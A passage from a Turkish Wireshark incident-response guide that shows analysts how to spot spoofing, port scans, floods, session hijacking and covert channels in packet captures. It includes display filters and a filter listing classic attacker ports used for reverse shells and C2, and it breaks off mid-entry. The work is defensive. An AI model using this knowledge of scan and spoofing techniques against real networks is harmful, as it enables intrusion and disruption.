**Filtreler (araştırma yolu):**

- `ip.src == 10.0.0.20` → IP'nin taşındığı tüm çerçeveler; Ethernet kaynağına bak
- `arp.src.proto_ipv4 == 10.0.0.20` → bu IP için kullanılan MAC'ler
- `eth.src[0] & 2` → "yerel yönetimli" (rastgele/elle atanmış) MAC adresleri

**Filtreden sonra yol tarifi:**

1. Şüpheli IP'yi filtrele ve eth.src'yi sütun olarak ekle.
2. Zaman içinde MAC değişiyor mu bak. Değişim anı, kimlik değişim anıdır.
3. Yeni MAC'in üreticisine bak. "Locally administered" bitli MAC (ikinci hex hanesi 2, 6, A, E) elle atanmış veya rastgeledir.
4. Not: Modern telefonlar ve Windows Wi-Fi'da rastgele MAC kullanır; bu meşru olabilir, bağlamla değerlendir.

**Terimler:**

- **Locally administered MAC**: Üretici tarafından değil, yazılımla atanmış MAC.
- **NAC**: Ağa sadece izinli cihazları alan erişim kontrolü.

> **Anlık karar:** MAC değişikliği + aynı hostname = muhtemelen rastgele MAC (zararsız). MAC değişikliği + gateway IP'si = spoofing.


</details>

<details>
<summary><strong>048 · HSRP/VRRP üzerinden gateway ele geçirme</strong></summary>

**Metafor:** Asıl kapıcı ve yedek kapıcı arasındaki "kim nöbette" yarışmasına dışarıdan biri girip "en yüksek önceliğe sahip benim" demesi.

**Senden istenen:** "Yedekli gateway protokolünde sahte öncelik iddiası var mı?"

**Filtreler (araştırma yolu):**

- `hsrp` → HSRP paketleri
- `hsrp.priority == 255` → en yüksek öncelik iddiası
- `vrrp` → VRRP paketleri
- `vrrp.prio == 255` → VRRP'de en yüksek öncelik

**Filtreden sonra yol tarifi:**

1. HSRP/VRRP paketlerini filtrele ve kaynak IP/MAC'leri listele. Normalde 2 router vardır.
2. Üçüncü bir kaynak yüksek öncelikle "Active/Master" olmaya çalışıyorsa saldırıdır.
3. HSRP'de kimlik doğrulama verisi düz metindir; varsayılan "cisco" ise kolayca taklit edilir, bulguya ekle.
4. Sonrasında trafiğin yeni "aktif" gateway'e yönelip yönelmediğini kontrol et.

**Terimler:**

- **HSRP/VRRP**: İki router'ın tek sanal gateway gibi davranmasını sağlayan yedeklilik protokolleri.
- **Priority**: Hangi router'ın aktif olacağını belirleyen öncelik değeri.

> **Anlık karar:** Bu protokollerde yeni bir oyuncu = alarm. Ağ ekibine "kaç router olmalı?" diye sor.


</details>

<details>
<summary><strong>049 · GRE / IP-in-IP tünel içindeki trafiği görmek</strong></summary>

**Metafor:** Kargo konteynerinin içindeki kutuları açmak. Dışarıdan sadece konteyner görünür.

**Senden istenen:** "Tünelin içinde ne taşınıyor?"

**Filtreler (araştırma yolu):**

- `gre` → GRE tünel paketleri
- `ip.proto == 47` → GRE (protokol numarasıyla)
- `ip.proto == 4` → IP-in-IP
- `gre && http` → GRE içinde taşınan HTTP

**Filtreden sonra yol tarifi:**

1. Protocol Hierarchy'de GRE veya iç içe IP görüyorsan tünel var.
2. Wireshark iç paketi otomatik çözer; paket detayında iki ayrı "Internet Protocol" katmanı görürsün.
3. İç IP adresleri asıl konuşan taraflardır; dış IP'ler sadece tünel uçlarıdır.
4. İç trafikte normal analizini yap. Filtrelerde iç katmanı hedeflemek için katman operatörü kullanılabilir: ip.src#2.

**Terimler:**

- **GRE**: Genel amaçlı tünelleme protokolü.
- **Katman operatörü (#)**: Aynı alandan birden fazla varsa hangisini istediğini seçme (ip.src#2 = ikinci IP başlığı).

> **Anlık karar:** Tünel varsa "kim konuşuyor" sorusunun cevabı iç başlıktadır, dış başlık sadece taşıyıcıdır.


</details>

<details>
<summary><strong>050 · Duplicate IP (IP çakışması) tespiti</strong></summary>

**Metafor:** Aynı daire numarasının iki farklı kapıya yazılması; postacı şaşırır, mektuplar yanlış yere gider.

**Senden istenen:** "Ağda IP çakışması var mı, hangi cihazlar?"

**Filtreler (araştırma yolu):**

- `arp.duplicate-address-frame` → Wireshark'ın çakışma tespit ettiği çerçeveler
- `arp.duplicate-address-detected` → aynı IP için farklı MAC görüldü

**Filtreden sonra yol tarifi:**

1. Filtreyi uygula; Info sütunu iki MAC'i yazar.
2. Her iki MAC'in üreticisini ve diğer trafiğini incele: hangisi uzun süredir bu IP'yi kullanıyor?
3. Ani başlayan çakışma ve ardından gelen trafik yönlendirmesi ARP spoofing'e işaret eder (Problem 026).
4. Statik IP yanlış yapılandırması da çakışma yaratır; tek seferlikse ve trafik akışı değişmiyorsa genelde yapılandırma hatasıdır.

**Terimler:**

- **IP çakışması**: Aynı IP'nin aynı ağda iki cihazda kullanılması.
- **Statik IP**: Elle atanmış, DHCP'den gelmeyen adres.

> **Anlık karar:** Çakışma + gateway IP'si = önce saldırı düşün. Çakışma + sıradan istemci IP'si = önce yapılandırma hatası düşün.


</details>

## C · TCP/UDP Davranışı: Taramalar, Flood ve Bağlantı Anomalileri

*Taşıma katmanı ağın "telefon görüşmesi" kurallarıdır. Kim aradı, kim açtı, kim yüzüne kapattı, kim hattı meşgul etti; hepsi TCP bayraklarında yazar.*

<details>
<summary><strong>051 · TCP üçlü el sıkışmayı okumak (SYN, SYN-ACK, ACK)</strong></summary>

**Metafor:** Telefon görüşmesi: "Alo?" (SYN) - "Alo, buyrun?" (SYN-ACK) - "Merhaba, ben Ali" (ACK). Bu üçü olmadan konuşma başlamaz.

**Senden istenen:** Bütün TCP sorularının temeli. "Bağlantı kuruldu mu?", "Port açık mı?", "Kim başlattı?"

**Filtreler (araştırma yolu):**

- `tcp.flags.syn == 1 && tcp.flags.ack == 0` → 1. adım: arama (SYN)
- `tcp.flags.syn == 1 && tcp.flags.ack == 1` → 2. adım: cevap (SYN-ACK), port açık
- `tcp.flags.reset == 1 && tcp.flags.ack == 1` → SYN'e RST-ACK cevabı: port kapalı
- `tcp.flags.str` → (sütun yap) bayrakları ··S····· gibi tek bakışta gösterir

**Filtreden sonra yol tarifi:**

1. tcp.flags.str alanını sütun olarak ekle; artık her paketin bayraklarını harf olarak görürsün (S=SYN, A=ACK, R=RST, F=FIN, P=PUSH).
2. SYN'i gönderen taraf bağlantıyı başlatan (istemci) taraftır. Bu, "kim kime bağlandı" sorusunun kesin cevabıdır.
3. SYN → SYN-ACK → ACK sırasını gördüysen bağlantı kurulmuştur.
4. SYN → RST-ACK ise port kapalıdır. SYN → cevap yok ise firewall paketi düşürüyordur (filtered).
5. Statistics ▸ Flow Graph ile bu konuşmayı oklarla görselleştir.

**Terimler:**

- **TCP**: Güvenilir, sıralı veri aktaran taşıma protokolü.
- **Bayrak (flag)**: TCP başlığındaki açık/kapalı bitler: SYN, ACK, FIN, RST, PSH, URG.
- **RST**: Reset; "bu konuşma yok/kapat" demek.

> **Anlık karar:** Her analizde ilk soru: "SYN'i kim attı?" Bağlantının yönünü bilmeden saldırgan/kurban ayrımı yapılamaz.


</details>

<details>
<summary><strong>052 · SYN taraması (yarı açık port taraması) tespiti</strong></summary>

**Metafor:** Kapıları çalıp, biri "kim o?" dediği anda kaçmak. Kapı açıldığını öğrenirsin ama içeri girmezsin.

**Senden istenen:** "Port taraması yapılmış mı, hangi IP yapmış, tarama türü ne?"

**Filtreler (araştırma yolu):**

- `tcp.flags.syn == 1 && tcp.flags.ack == 0 && tcp.window_size <= 1024` → nmap -sS'in tipik küçük pencere değeri
- `tcp.flags.reset == 1 && tcp.flags.ack == 0` → tarayıcının SYN-ACK'e RST ile cevap vermesi (yarı açık imzası)
- `ip.src == 10.0.0.5 && tcp.flags.syn == 1 && tcp.flags.ack == 0` → tarayıcının tüm denemeleri

**Filtreden sonra yol tarifi:**

1. SYN filtresini uygula, Statistics ▸ Conversations ▸ TCP'de "Limit to display filter" ile tek kaynaktan çok sayıda farklı porta gidildiğini gör.
2. Açık portlarda akış SYN → SYN-ACK → RST şeklindedir (üçüncü adım ACK değil RST). Bu "yarı açık" taramadır.
3. Nmap SYN taramasında pencere boyutu genelde 1024 ve MSS 1460 olur; kaynak port taramada sabit kalır.
4. Taranan port sayısını ve aralığını çıkar (tshark ile tcp.dstport listesi, Problem 024).

**Terimler:**

- **Half-open scan**: Bağlantıyı tamamlamadan port durumunu öğrenen tarama (nmap -sS).
- **Window size**: TCP'nin "şu kadar veri alabilirim" bildirdiği değer.

> **Anlık karar:** SYN-ACK'ten sonra ACK yerine RST geliyorsa karşında insan değil tarama aracı var.


</details>

<details>
<summary><strong>053 · Hangi portlar açık çıktı? Tarama sonucunu okumak</strong></summary>

**Metafor:** Kapı çalma turunun sonunda hangi kapıların "buyrun" dediğinin listesini çıkarmak.

**Senden istenen:** "Taramada hangi portlar açık bulundu?", "Saldırgan hangi servisleri gördü?"

**Filtreler (araştırma yolu):**

- `ip.src == 10.0.0.20 && tcp.flags.syn == 1 && tcp.flags.ack == 1` → hedefin SYN-ACK döndüğü (açık) portlar
- `ip.src == 10.0.0.20 && tcp.flags.reset == 1` → hedefin RST döndüğü (kapalı) portlar
- `icmp.type == 3 && icmp.code == 3` → UDP taramada "port unreachable" (kapalı UDP port)

**Komut satırı:**

```bash
tshark -r kanit.pcapng -Y 'ip.src == 10.0.0.20 && tcp.flags.syn == 1 && tcp.flags.ack == 1' -T fields -e tcp.srcport | sort -nu
```

**Filtreden sonra yol tarifi:**

1. Hedef IP'den çıkan SYN-ACK'leri filtrele. Kaynak port sütunu açık portları verir.
2. tshark komutuyla benzersiz açık port listesini çıkar.
3. Port numaralarını servislerle eşleştir (22 SSH, 80 HTTP, 445 SMB, 3389 RDP...).
4. Saldırganın sonraki adımı genelde bu açık portlardan birine yöneliktir; o porttaki ilk "gerçek" bağlantıyı bul.

**Terimler:**

- **Kaynak port (srcport)**: Paketi gönderen tarafın portu. SYN-ACK'te kaynak port, sunucunun açık portudur.
- **ICMP Port Unreachable**: Type 3 Code 3; UDP portunun kapalı olduğu cevabı.

> **Anlık karar:** Açık port = hedefin SYN-ACK'indeki kaynak port. Bu formülü ezberle.


</details>

<details>
<summary><strong>054 · TCP Connect taraması</strong></summary>

**Metafor:** Her kapıyı çalıp içeri girip "merhaba" deyip çıkmak. Daha gürültülü, daha çok iz bırakır.

**Senden istenen:** "Tarama türü SYN mi Connect mi?" (yetkisiz kullanıcının yaptığı tarama genelde Connect'tir.)

**Filtreler (araştırma yolu):**

- `tcp.flags.syn == 1 && tcp.flags.ack == 0 && tcp.window_size > 1024` → işletim sisteminin normal pencere değerli SYN'ler
- `tcp.flags == 0x010 && tcp.len == 0` → el sıkışmayı tamamlayan saf ACK'ler
- `tcp.flags.reset == 1 && tcp.flags.ack == 1` → bağlantıyı hemen kapatan RST-ACK

**Filtreden sonra yol tarifi:**

1. Açık porta yapılan denemede akışa bak: SYN → SYN-ACK → ACK → (hemen) RST-ACK ise Connect taramasıdır.
2. SYN'lerin TCP seçenekleri zengindir (MSS, SACK, Timestamp, Window Scale); bu, işletim sisteminin gerçek soket çağrısı olduğunu gösterir.
3. Kaynak portlar her denemede değişir (SYN taramasında genelde sabittir).
4. Sonucu zaman çizelgesine "tam bağlantı taraması" olarak yaz.

**Terimler:**

- **Connect scan**: İşletim sisteminin connect() çağrısıyla tam bağlantı kuran tarama (nmap -sT).
- **TCP options**: SYN paketinde taraflarının yeteneklerini bildiren ek alanlar.

> **Anlık karar:** Ayırt edici nokta 3. paket: SYN taramasında RST, Connect taramasında ACK.


</details>

<details>
<summary><strong>055 · FIN / NULL / Xmas taramaları</strong></summary>

**Metafor:** Kapıyı çalmak yerine kapının altından anlamsız notlar atmak; cevap gelip gelmemesine göre içeride kimin olduğunu tahmin etmek.

**Senden istenen:** "Gizli (stealth) tarama teknikleri kullanılmış mı?"

**Filtreler (araştırma yolu):**

- `tcp.flags == 0x000` → NULL tarama: hiç bayrak yok
- `tcp.flags == 0x001` → FIN tarama: sadece FIN
- `tcp.flags == 0x029` → Xmas tarama: FIN + PSH + URG
- `tcp.flags.fin == 1 && tcp.flags.ack == 0` → ACK'siz FIN (normal trafikte FIN hep ACK ile gelir)

**Filtreden sonra yol tarifi:**

1. Bu üç filtreyi sırayla uygula. Normal trafikte hiçbiri görülmez.
2. Kaynak IP'yi ve hedeflenen port aralığını belirle.
3. Cevapları yorumla: kapalı porttan RST gelir, açık porttan hiçbir şey gelmez.
4. Windows hedefler her durumda RST döndüğünden bu taramalar Windows'ta işe yaramaz; saldırganın hedef işletim sistemini bilip bilmediğine dair ipucu verir.

**Terimler:**

- **NULL/FIN/Xmas**: TCP standardındaki bir boşluğu kullanan gizli tarama türleri (nmap -sN/-sF/-sX).
- **0x029**: Bayrak bitlerinin onaltılık değeri: FIN(1) + PSH(8) + URG(32) = 41 = 0x29.

> **Anlık karar:** ACK'siz FIN, bayraksız TCP veya FIN+PSH+URG = yüzde yüz araç üretimi paket.


</details>

<details>
<summary><strong>056 · ACK taraması (firewall haritalama)</strong></summary>

**Metafor:** Kapının arkasında kim olduğunu değil, kapıda bekçi olup olmadığını anlamaya çalışmak.

**Senden istenen:** "Saldırgan firewall kurallarını mı haritaladı?"

**Filtreler (araştırma yolu):**

- `tcp.flags == 0x010 && tcp.len == 0 && ip.src == 10.0.0.5` → tarayıcının gönderdiği yalın (verisiz) ACK'ler
- `tcp.analysis.ack_lost_segment` → Wireshark bağlamsız ACK'leri genelde "ACKed unseen segment" diye işaretler
- `tcp.flags.reset == 1 && tcp.flags.ack == 0 && ip.dst == 10.0.0.5` → ACK'e dönen yalın RST'ler (unfiltered port)

**Filtreden sonra yol tarifi:**

1. Önce SYN'i olmayan TCP akışlarını bul: Conversations ▸ TCP'de sadece 1-2 paketlik çok sayıda akış.
2. Akış tek bir ACK ve (varsa) RST'den oluşuyorsa ACK taramasıdır (nmap -sA).
3. RST dönen portlar "unfiltered" (firewall geçiriyor), cevap gelmeyenler "filtered" (firewall engelliyor).
4. Bu bulgu saldırganın firewall'u atlatmaya hazırlandığını gösterir.

**Terimler:**

- **Stateful firewall**: Bağlantı durumunu takip eden firewall; bağlamsız ACK'i düşürür.
- **Göreli sıra numarası**: Wireshark'ın okumayı kolaylaştırmak için 0'dan başlattığı seq/ack değeri.

> **Anlık karar:** SYN'siz başlayan TCP akışı ya kaydın ortasından başlamıştır ya da ACK taramasıdır. Sayıları çoksa ikincisidir.


</details>

<details>
<summary><strong>057 · UDP port taraması</strong></summary>

**Metafor:** Cevap vermeyen birine mektup atıp, "böyle biri yok" iadesinin gelip gelmemesine bakmak.

**Senden istenen:** "UDP servisleri taranmış mı (DNS, SNMP, NTP...)?"

**Filtreler (araştırma yolu):**

- `icmp.type == 3 && icmp.code == 3` → kapalı UDP portundan dönen "port unreachable"
- `udp && ip.src == 10.0.0.5 && udp.length <= 8` → yükü boş UDP paketleri (nmap -sU)
- `udp.dstport in {53, 69, 123, 137, 161, 500, 1900}` → klasik UDP servis portlarına giden paketler

**Filtreden sonra yol tarifi:**

1. ICMP Port Unreachable'ları filtrele; çoksa UDP taraması vardır. Bu paketlerin içinde orijinal UDP başlığı görünür.
2. Tarayıcının IP'sini ve taranan portları içteki orijinal UDP başlığından çıkar.
3. Cevap dönen (gerçek UDP verisi gelen) portlar açıktır; ICMP gelmeyen ama veri de gelmeyenler "open|filtered".
4. SNMP (161) açık çıktıysa ardından community string denemesi var mı bak (Problem 207).

**Terimler:**

- **UDP**: Bağlantısız taşıma protokolü; el sıkışma yoktur.
- **open|filtered**: Nmap'in "açık mı engelli mi bilemiyorum" durumu.

> **Anlık karar:** UDP taramasının en net izi ICMP Type 3 Code 3 yağmurudur.


</details>

<details>
<summary><strong>058 · Nmap servis/versiyon/OS tespiti izleri</strong></summary>

**Metafor:** Kapıyı açtıran hırsızın içeri bakıp "bu kasa hangi marka?" diye incelemesi.

**Senden istenen:** "Saldırgan servis sürümlerini tespit etmeye çalışmış mı?", "Hangi araç kullanılmış?"

**Filtreler (araştırma yolu):**

- `http.user_agent contains "Nmap"` → Nmap Scripting Engine HTTP istekleri
- `frame contains "nmap"` → paket içinde nmap izi
- `tcp.flags.syn == 1 && tcp.options.mss_val == 265` → nmap OS tespit paketlerinde görülen alışılmadık MSS değerlerinden biri
- `tcp.flags == 0x02b || tcp.flags == 0x0c2` → OS tespit problarındaki absürt kombinasyonlar: SYN+FIN+PSH+URG ve SYN+ECE+CWR

**Filtreden sonra yol tarifi:**

1. Tarama sonrasında açık portlara yapılan kısa ve çok çeşitli istekleri bul (GET /, OPTIONS, HELP, garip byte'lar).
2. Follow Stream ile bu istekleri oku; nmap -sV prob'ları (ör. "GET / HTTP/1.0", SSL hello, RPC sorguları) tanıdık desenler içerir.
3. HTTP User-Agent'ta "Nmap Scripting Engine" yazar.
4. OS tespiti (-O) için absürt bayrak kombinasyonları ve garip TCP seçenekleri ara.

**Terimler:**

- **Version detection**: Açık portta hangi yazılım ve sürümün çalıştığını tespit etme (nmap -sV).
- **NSE**: Nmap Scripting Engine; nmap'in betik motoru.

> **Anlık karar:** Taramadan sonra açık portlara 1-2 saniye içinde onlarca farklı prob = -sV. Saldırgan artık hedefini seçiyor.


</details>

<details>
<summary><strong>059 · SYN flood (DoS)</strong></summary>

**Metafor:** Bir restorana sahte isimlerle yüzlerce telefon rezervasyonu açıp hiçbirine gelmemek; masalar dolar, gerçek müşteri giremez.

**Senden istenen:** "Hizmet reddi saldırısı var mı, hedef ve kaynaklar neler?"

**Filtreler (araştırma yolu):**

- `tcp.flags.syn == 1 && tcp.flags.ack == 0 && ip.dst == 10.0.0.20` → hedefe gelen SYN'ler
- `tcp.flags.syn == 1 && tcp.flags.ack == 1 && tcp.analysis.retransmission` → sunucunun cevapsız kalıp tekrar gönderdiği SYN-ACK'ler

**Filtreden sonra yol tarifi:**

1. I/O Graph'ta SYN sayısını zamana göre çiz; dik bir yükseliş flood demektir.
2. Endpoints'te kaynak çeşitliliğine bak: binlerce farklı IP ise spoof (Problem 040), tek IP ise basit flood.
3. Bağlantıların tamamlanıp tamamlanmadığını kontrol et: SYN çok, ACK yok = yarım bağlantılar.
4. Sunucunun SYN-ACK retransmission'ları bellek tükenmesinin işaretidir.
5. Hedef portu not et (genelde 80/443).

**Terimler:**

- **DoS / DDoS**: Hizmet reddi / dağıtık hizmet reddi; servisi kullanılamaz hale getirme.
- **Backlog**: Sunucunun yarım bağlantıları beklettiği kuyruk.

> **Anlık karar:** SYN/SYN-ACK oranı 1'in çok üstündeyse ve ACK'ler yoksa flood vardır.


</details>

<details>
<summary><strong>060 · UDP flood ve amplifikasyon (DNS, NTP, memcached)</strong></summary>

**Metafor:** Bir megafona fısıldayıp sesi hedefe yönlendirmek. Küçük istek, kurbana dev cevap olarak döner.

**Senden istenen:** "Amplifikasyon saldırısı var mı, hangi protokol kullanılmış?"

**Filtreler (araştırma yolu):**

- `dns.qry.type == 255` → ANY sorguları (DNS amplifikasyonu)
- `ntp.priv.reqcode == 42` → NTP monlist (MON_GETLIST_1) isteği
- `udp.srcport == 11211` → memcached cevapları
- `udp && frame.len > 1000 && ip.dst == 10.0.0.20` → kurbana gelen büyük UDP paketleri

**Filtreden sonra yol tarifi:**

1. Kurbanın aldığı UDP trafiğini kaynak portuna göre grupla (Statistics ▸ Conversations ▸ UDP). Kaynak port 53, 123, 1900, 11211 ise amplifikasyon.
2. İstek/cevap boyutlarını karşılaştır; amplifikasyon katsayısı = cevap boyutu / istek boyutu.
3. Eğer pcap amplifier (yansıtıcı) tarafından alındıysa istekleri kurbanın IP'si kaynak olarak görünür (spoof).
4. Saldırının başlangıç ve tepe zamanını I/O Graph'tan al.

**Terimler:**

- **Amplification**: Küçük istekle büyük cevap üretip, sahte kaynak IP ile kurbana yönlendirme.
- **Reflector**: Cevabı kurbana yansıtan masum sunucu.

> **Anlık karar:** Kurban tarafında "hiç istemediğim cevaplar geliyor" görüyorsan amplifikasyondur.


</details>

<details>
<summary><strong>061 · Bağlantı sürekli RST ile kesiliyor</strong></summary>

**Metafor:** Telefon açılır açılmaz biri hattı kesiyor. Ya karşı taraf istemiyor, ya araya biri girip kesiyor.

**Senden istenen:** "Neden bağlantı kurulamıyor?", "RST'leri kim gönderiyor?"

**Filtreler (araştırma yolu):**

- `tcp.flags.reset == 1` → tüm RST'ler
- `tcp.flags.reset == 1 && tcp.seq > 1` → veri aktarımı sırasında gelen RST (ortadan kesme)
- `tcp.flags.reset == 1 && ip.ttl != 64 && ip.ttl != 128` → TTL'i tutarsız RST'ler (araya girilmiş olabilir)

**Filtreden sonra yol tarifi:**

1. RST'leri filtrele ve kimin gönderdiğine bak: sunucu mu, istemci mi, üçüncü bir cihaz mı?
2. SYN'e hemen RST: port kapalı veya servis çalışmıyor.
3. Veri aktarımının ortasında RST: uygulama çökmüş, firewall/IPS kesmiş veya RST enjeksiyonu var.
4. RST'nin TTL değeri ve IP ID değeri, aynı kaynağın normal paketleriyle uyuşuyor mu? Uyuşmuyorsa başka cihaz göndermiştir (Problem 064).

**Terimler:**

- **RST injection**: Üçüncü tarafın sahte RST göndererek bağlantıyı koparması (ör. IPS veya sansür sistemi).
- **IPS**: Saldırı önleme sistemi; bağlantıları aktif olarak kesebilir.

> **Anlık karar:** RST'yi kim attı sorusunun cevabı TTL'dedir. Gerçek sunucunun TTL'iyle uymayan RST "araya giren"in RST'sidir.


</details>

<details>
<summary><strong>062 · TCP retransmission fırtınası: ağ sorunu mu, saldırı mı?</strong></summary>

**Metafor:** Postacı aynı mektubu tekrar tekrar getiriyor çünkü kimse "aldım" diye imza atmıyor.

**Senden istenen:** "Ağ neden yavaş?", "Paket kaybı nerede?"

**Filtreler (araştırma yolu):**

- `tcp.analysis.retransmission` → tekrar gönderilen paketler
- `tcp.analysis.fast_retransmission` → hızlı tekrar (alıcı 3 kez "eksik var" dedi)
- `tcp.analysis.duplicate_ack` → alıcının "hâlâ şu paketi bekliyorum" tekrarları
- `tcp.analysis.lost_segment` → kayıtta eksik görünen segment
- `tcp.analysis.flags && !tcp.analysis.window_update` → tüm TCP sorunları (pencere güncellemeleri hariç)

**Filtreden sonra yol tarifi:**

1. tcp.analysis.flags ile tüm sorunlu paketleri gör, Expert Info'da türlerine göre say.
2. Retransmission'lar tek bir konuşmada mı, tüm ağda mı? Conversations ▸ TCP'de "Limit to display filter" ile bul.
3. Tek bir sunucudaysa sunucu/uygulama sorunu; tüm ağdaysa hat/cihaz sorunu.
4. Saldırı bağlamında: DoS altındaki sunucu retransmission üretir; ayrıca tünel ve covert channel araçları da anormal retransmission yaratabilir.
5. "lost_segment" genelde yakalama kaybıdır (sensör yetişememiş); analizde veri eksik olabileceğini not et.

**Terimler:**

- **Retransmission**: Onay alınamayan paketin tekrar gönderilmesi.
- **Duplicate ACK**: Alıcının aynı onayı tekrarlayarak eksik paketi işaret etmesi.
- **Packet loss**: Paket kaybı.

> **Anlık karar:** Önce "kayıt mı eksik, ağ mı eksik?" sor. Previous segment not captured çoksa sensör kaçırmıştır.


</details>

<details>
<summary><strong>063 · Zero window: uygulama veri alamıyor</strong></summary>

**Metafor:** Bardağı dolu olan birine su doldurmaya çalışmak. Alıcı "bardağım dolu, dur" diyor.

**Senden istenen:** Performans sorunlarında "darboğaz ağ mı uygulama mı?"

**Filtreler (araştırma yolu):**

- `tcp.analysis.zero_window` → alıcı pencereyi sıfırladı
- `tcp.analysis.window_full` → gönderici pencere sınırına dayandı
- `tcp.analysis.zero_window_probe` → gönderici "hâlâ dolu mu?" diye yokluyor

**Filtreden sonra yol tarifi:**

1. Zero window paketlerini filtrele ve kimin gönderdiğine bak; o taraf yavaş olan taraftır.
2. Süreyi ölç: zero window'dan window update'e kadar geçen zaman, uygulamanın takıldığı süredir.
3. DFIR bağlamında: hedef sistemde kaynak tükenmesi (DoS, yoğun disk şifreleme sırasında ransomware) zero window üretebilir.
4. Slowloris benzeri saldırılarda istemci tarafının küçük pencere ilan etmesi de görülebilir (Problem 065).

**Terimler:**

- **TCP window**: Alıcının o an kabul edebileceği veri miktarı.
- **Zero window**: Pencerenin 0 olması; alıcı veri kabul edemiyor.

> **Anlık karar:** Zero window'u gönderen taraf "suçlu"dur. Ağ değil, o uç nokta yavaştır.


</details>

<details>
<summary><strong>064 · TCP oturum ele geçirme (session hijacking) ve RST enjeksiyonu</strong></summary>

**Metafor:** İki kişi telefonda konuşurken araya girip birinin sesini taklit ederek konuşmaya devam etmek.

**Senden istenen:** "Mevcut bir oturuma sahte paket enjekte edilmiş mi?"

**Filtreler (araştırma yolu):**

- `tcp.analysis.out_of_order || tcp.analysis.duplicate_ack` → sıra numarası karmaşası
- `tcp.stream == 8 && tcp.flags.reset == 1` → şüpheli oturumda RST
- `tcp.analysis.ack_lost_segment` → hiç görülmemiş bir veriye onay (araya veri girmiş olabilir)

**Filtreden sonra yol tarifi:**

1. Şüpheli oturumu tcp.stream ile izole et.
2. Aynı yönden gelen paketlerde TTL, IP ID ve MAC tutarlılığına bak. Farklı değerli paket = enjeksiyon.
3. Enjeksiyondan sonra "ACK storm" oluşur: iki taraf birbirine sürekli duplicate ACK atar.
4. Enjekte edilen yükü Follow Stream ile oku (ör. telnet oturumuna eklenen komut).

**Terimler:**

- **Session hijacking**: Kimliği doğrulanmış bir oturumu ele geçirme.
- **Sequence number**: TCP'de her byte'a verilen sıra numarası; enjeksiyon için tahmin edilmesi gerekir.
- **ACK storm**: Senkronu bozulmuş iki tarafın sonsuz onay döngüsü.

> **Anlık karar:** Aynı akışta aynı yönden gelen paketlerin TTL'i farklıysa o akışa birisi dahil olmuştur.


</details>

<details>
<summary><strong>065 · Yavaş saldırılar: Slowloris ve benzerleri</strong></summary>

**Metafor:** Bankada gişeyi tutan ve her dakika bir kelime söyleyen müşteri. Gişe meşgul kalır, sıra ilerlemez.

**Senden istenen:** "Web sunucusu neden yanıt vermiyor, çok sayıda yarım bağlantı mı var?"

**Filtreler (araştırma yolu):**

- `tcp.dstport == 80 && tcp.len > 0 && tcp.len < 20` → web portuna giden çok küçük veri parçaları
- `http.request.method == "POST" && http.content_length > 100000` → R.U.D.Y. (yavaş POST) adayı

**Filtreden sonra yol tarifi:**

1. Conversations ▸ TCP'de web sunucusuna giden çok sayıda uzun süreli ama az byte'lı bağlantı ara.
2. Bir akışı Follow Stream ile aç: başlıklar tamamlanmıyor, her birkaç saniyede bir "X-a: b" gibi anlamsız başlık ekleniyorsa Slowloris'tir.
3. Paketler arası süreyi (tcp.time_delta sütunu) ölç; düzenli 10-15 saniyelik boşluklar aracı gösterir.
4. Kaynak IP sayısı azdır; az IP çok bağlantı açar.

**Terimler:**

- **Slowloris**: HTTP başlıklarını çok yavaş gönderip sunucu bağlantılarını tüketen saldırı.
- **R.U.D.Y.**: POST gövdesini çok yavaş gönderen benzer saldırı.

> **Anlık karar:** Az kaynak, çok bağlantı, az byte, uzun süre: yavaş DoS'un dört göstergesi.


</details>

<details>
<summary><strong>066 · Uzun süreli bağlantıları (long-lived connections) bulmak</strong></summary>

**Metafor:** Bir kafede saatlerce oturup çay bile söylemeyen müşteri. Normal müşteri gelir, tüketir, gider.

**Senden istenen:** "Kalıcı arka kapı (persistent C2) veya reverse shell var mı?"

**Filtreler (araştırma yolu):**

- `tcp.time_relative > 600` → başlangıcından 10 dakikadan uzun süren akışlardaki paketler
- `tcp.analysis.keep_alive` → bağlantıyı açık tutmaya yarayan keep-alive paketleri

**Menü / araç:**

- Statistics ▸ Conversations ▸ TCP → Duration sütununa göre azalan sırala

**Filtreden sonra yol tarifi:**

1. Conversations'ta Duration'a göre sırala; en üsttekiler uzun yaşayan bağlantılardır.
2. Bunları beklenen servislerle karşılaştır (VPN, veritabanı, RDP oturumu meşru olabilir).
3. Dış IP'ye giden, standart dışı portta, uzun ve düşük hacimli bağlantılar en şüphelileridir.
4. Akışı Follow Stream ile aç; düz metin komut görüyorsan reverse shell'dir (Problem 179).

**Terimler:**

- **Long-lived connection**: Saatlerce açık kalan bağlantı.
- **Keep-alive**: Bağlantının kopmaması için gönderilen boş yoklama paketi.
- **tcp.time_relative**: Akışın ilk paketinden beri geçen süre.

> **Anlık karar:** Uzun süre + düşük hacim + dış hedef + garip port = öncelikli şüpheli.


</details>

<details>
<summary><strong>067 · Bilinen portta farklı protokol (port/protokol uyumsuzluğu)</strong></summary>

**Metafor:** Üzerinde "süt" yazan şişeden benzin çıkması. Etiket yalan söylüyor.

**Senden istenen:** "Firewall'u atlatmak için standart porta başka protokol gizlenmiş mi?"

**Filtreler (araştırma yolu):**

- `tcp.port == 443 && !tls` → 443'te TLS olmayan trafik
- `tcp.port == 80 && !http && tcp.len > 0` → 80'de HTTP olmayan veri
- `udp.port == 53 && !dns` → 53'te DNS olmayan trafik
- `tcp.port == 22 && !ssh && tcp.len > 0` → 22'de SSH olmayan veri

**Filtreden sonra yol tarifi:**

1. Bu filtreleri sırayla uygula. Sonuç dönen her paket bir uyumsuzluktur.
2. Follow Stream ile içeriğe bak; ne konuşulduğunu tanımlamaya çalış (düz metin shell, özel C2, şifreli blob).
3. Gerekirse Decode As ile doğru protokolü ata (Problem 017).
4. Kaynağı ve hedefi zararlı altyapı olarak işaretle.

**Terimler:**

- **Port**: Bir makinedeki servislerin numaralı kapıları.
- **Protocol mismatch**: Portun beklenen protokolü ile gerçek trafiğin uyuşmaması.

> **Anlık karar:** Saldırganlar 443 ve 53'ü sever çünkü her firewall bu portlara izin verir. "443 ama TLS değil" her zaman incelenir.


</details>

<details>
<summary><strong>068 · Yüksek portlar arası şüpheli iletişim</strong></summary>

**Metafor:** Binanın ana kapısı yerine bodrum penceresinden girip çıkan biri.

**Senden istenen:** "Standart olmayan portlarda kim konuşuyor?"

**Filtreler (araştırma yolu):**

- `tcp.srcport > 1024 && tcp.dstport > 1024 && tcp.flags.syn == 1 && tcp.flags.ack == 0` → iki ucu da yüksek port olan bağlantı başlatmalar
- `tcp.dstport in {4444, 4445, 1337, 31337, 8888, 9001, 6666, 6667}` → saldırganların sevdiği klasik portlar
